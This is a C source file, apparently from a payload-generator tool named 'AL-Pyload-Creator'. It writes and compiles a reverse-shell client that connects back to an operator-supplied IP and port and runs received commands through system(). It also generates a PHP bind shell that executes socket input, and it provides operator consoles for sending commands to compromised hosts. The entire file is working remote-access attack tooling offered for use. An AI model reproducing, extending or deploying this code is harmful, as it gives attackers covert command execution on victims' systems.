#include "func.h"

void banner()
{
	printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\033[0;0f");

                        printf(

                        "                   ___________________________________\n"
                        "          \033[31m||\033[0m      |         \033[31m|||\033[0m                       \\\n"
                        "          \033[31m||\033[0m      |         \033[31m|||\033[0m                        |__\n"
                        "          \033[31m|||||||||||||||||||||\033[0m   \033[93m/\\   |   *     /\\\033[0m    |  |\n"
                        "          \033[31m|||||||||||||||||||||\033[0m  \033[93m/__\\  |   |    /__\\\033[0m   |  |──────────────\n"
                        "          \033[31m|||||||||||||||||||||\033[0m \033[93m/    \\ |__ | * /    \\\033[0m  |__|\n"
                        "          \033[31m||\033[0m      |         \033[31m|||\033[0m                        |\n"
                        "          \033[31m||\033[0m      |_________\033[31m|||\033[0m______________________ /\n\n"
                        );
}

int TargetCreator(char* name, char* ip, int port)
{
	Wait(1, 0);
	sleep(1);

	mkdir(name, 0764);

        char name_c[1024];
        sprintf(name_c, "%s/%s.c", name, name);

        FILE* f = fopen(name_c, "w");

	if(f == NULL) return 0;

        fprintf(f,
                        "#include <stdio.h>\n"
                        "#include <sys/socket.h>\n"
                        "#include <arpa/inet.h>\n"
                        "#include <unistd.h>\n"
                        "#include <string.h>\n"
                        "#include <stdlib.h>\n"
                        "\n"
                        "#define PORT %d\n"

                        "\n"
                        "int main(int argc, char const *argv[])\n"
                        "{\n"
			"	int  a = fork();\n"
			"	if(a == 0)\n"
			"	{\n"
                        "       	int sock = 0;\n"
                        "       	struct sockaddr_in serv_addr;\n"
                        "       	char *hello = \"Hello from client\";\n"
                        "       	char buffer[1024] = {0};\n"
                        "       	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n"
                        "       	{\n"
                        "       	        return -1;\n"
                        "       	}\n"
                        "\n"
                        "   	    	serv_addr.sin_family = AF_INET;\n"
                        "       	serv_addr.sin_port = htons(PORT);\n"
                        "\n"

                        "       	if(inet_pton(AF_INET, \"%s\", &serv_addr.sin_addr)<=0)\n"
                        "       	{\n"
                        "               	return -1;\n"
                        "       	}\n"
                        "\n"
                        "   		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)\n"
                        "       	{\n"
                        "               	return -1;\n"
                        "       	}\n"
                        "       	send(sock , hello , strlen(hello) , 0);\n"
                        "\n"
			"		while(1)\n"
			"		{\n"
			"		       char com[1024];\n"
			"                      read(sock , buffer, 1024);\n"
			"			if(strstr(buffer, \"cd\"))\n"
			"			{\n"
			"				char add[1024];\n"
			"				sscanf(buffer, \"cd %%s\", add);\n"
			"				chdir(add);\n"
			"				continue;\n"
			"			}\n"
			"		       if(buffer[0] == '\\0') return -1;\n"
			"                      for(int i = 0; i < strlen(buffer); i++) if(buffer[i] == '\\n') buffer[i] = '\\0';\n"
			"		       com[0] = '\\0';\n"
			"\n"
			"                      sprintf(com, \"%%s > .log\", buffer);\n"
			"                      system(com);\n"
			"\n"
			"                      FILE* f = fopen(\".log\", \"r\");\n"
			"\n"
			"		       char* out = (char*) malloc (sizeof(char*)*100000000);\n"
			"                      for(int i = 0; 1; i++)\n"
			"                      {\n"
			"                              int tmp = fgetc(f);\n"
			"                              if(feof(f)) break;\n"
			"\n"
			"                              out[i] = tmp;\n"
			"                      }\n"
			"\n"
                        "               	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 && buffer[0] != ' ')\n"
                        "               	{\n"
                        "                      		send(sock, out, strlen(out), 0);\n"
                        "               	}\n"
			"\n"
			"                      fclose(f);\n"
                        "                      free(out);\n"
                        "                      buffer[0] = '\\0';\n"
                        "                      remove(\".log\");\n"
                        "               }\n"
                        "	}\n"
                        "       return 0;\n"
                        "}\n"

                , port, ip);

	fclose(f);

	char command[1024];
	sprintf(command, "cc -o %s/%s %s/%s.c", name, name, name, name);

	system(command);

	sprintf(command, "%s/help.txt", name);
	f = fopen(command, "w");

	fprintf(f, "port number : %d\n", port);

	fclose(f);

	return 1;
}

int TargetCreator_server(char* name, int port)
{
	Wait(1, 0);
	sleep(1);

	mkdir(name, 0764);

        char name_php[1024];
        sprintf(name_php, "%s/%s.php", name, name);

        FILE* f = fopen(name_php, "w");

	if(f == NULL) return 0;

        fprintf(f,
"{\n"
"	$a = pcntl_fork();\n"
"	if($a == 0)\n"
"	{\n"
"		$IP 	= (\"127.0.0.1\");\n"
"		$PORT 	= (%d);\n"
"	\n"
"		set_time_limit(0);\n"
"\n"
"		$server = socket_create(AF_INET, SOCK_STREAM, 0) or die(\"create SOCKET\");\n"
"	\n"
"		$res  	= socket_bind($server, $IP, $PORT) or die(\"bind\");\n"
"\n"
"		$res  	= socket_listen($server, 1000) or die(\"listen\");\n"
"\n"
"		$news 	= socket_accept($server) or die(\"accept\");\n"
"\n"
"		$input = \"hello\";\n"
"		while($input != '\\0')\n"
"		{\n"
"			$input  = '\\n';\n"
"			$input 	= socket_read($news, 100000000);\n"
"\n"
"			if(substr($input, 0, 3) == \"cd \")\n"
"			{\n"
"				chdir(substr($input, 3, -1));\n"
"				continue;\n"
"			}\n"
"\n"
"			system((\"$input > tmp\"));\n"
"			$exec = file_get_contents(\"tmp\");\n"
"			socket_write($news, $exec, strlen($exec));\n"
"		}\n"
"	}			\n"
"}\n"
                , port);

	fclose(f);

	char fname[1024];

	sprintf(fname, "%s/help.txt", name);
	f = fopen(fname, "w");

	fprintf(f, "port number : %d\n", port);

	fclose(f);

	return 1;
}

void gettingAccess(int port)
{
        int server;
        if((server = socket(AF_INET, SOCK_STREAM, 0)) == 0) printf("error for creat socket!\n");

        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = INADDR_ANY;
        sa.sin_port = htons(port);

        if(bind(server, (struct sockaddr *)&sa, sizeof(sa)) < 0) printf("port not found!\n");
        if(listen(server, 3) < 0) printf("error for listenning!\n");

        int new_s;
        int size = sizeof(sa);
        if((new_s = accept(server, (struct sockaddr *)&sa, (socklen_t *)&size)) < 0) printf("error for accept!\n");

        char str[1024] = {0};

        read(new_s, str, 1024);

        while(1)
        {
 	       char* out = (char*) malloc (sizeof(char*)*100000000);

                printf("\033[31m┌─[\033[39m%d\033[93m@\033[96mAL-Pyload-Creator\033[31m]─[\033[32m%s\033[31m]\n└──╼ \033[93m#\033[39m ",port,  getenv("PWD"));
                fgets(str, sizeof(str), stdin);

		int s = fork();
		if(s == 0)
		{
	                send(new_s, str, strlen(str), 0);

			if(str[0] != ' ')
			{
				read(new_s, out, 100000000);
		                printf("\n\n%s", out);
			}else
			{
				printf("%s OK", str);
			}
		}
        	free(out);

        }

}


int gettingAccess_server(int port, char* IP)
{
	int sock;
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("\033[91mprogram cannot create a socket\n");
		return 0;
	}

	struct sockaddr_in s;
	s.sin_family = AF_INET;
	s.sin_port = htons(port);

	inet_pton(AF_INET, IP, &s.sin_addr);

	if(connect(sock, (struct sockaddr* )&s, sizeof(s)) < 0)
	{
		printf("can not connecting to server \n");
		return 0;
	}

        char str[1024] = {0};

        while(1)
        {
 	       char* out = (char*) malloc (sizeof(char*)*100000000);

                printf("\033[31m┌─[\033[39m%d\033[93m@\033[96mAL-Pyload-Creator\033[31m]─[\033[32m%s\033[31m]\n└──╼ \033[93m#\033[39m ",port,  getenv("PWD"));
                fgets(str, sizeof(str), stdin);

		int s = fork();
		if(s == 0)
		{
	                send(sock, str, strlen(str), 0);

			read(sock, out, 100000000);
		        printf("\n\n%s", out);
		}
        	free(out);
        }
}

int Wait(int number, int color_code)
{
	int a = fork();
	if(a == 0)
	{
        	printf("\033[10;5f[\033[10;105f]");
        	for(int i = 6; i < 105; i++)
		{
			printf("\033[%dm\033[10;1f%%%d\033[10;%df█", color_code,i-4 ,i);
			usleep(10000*number);
		}
	}

	printf("\n");
	return 0;
}
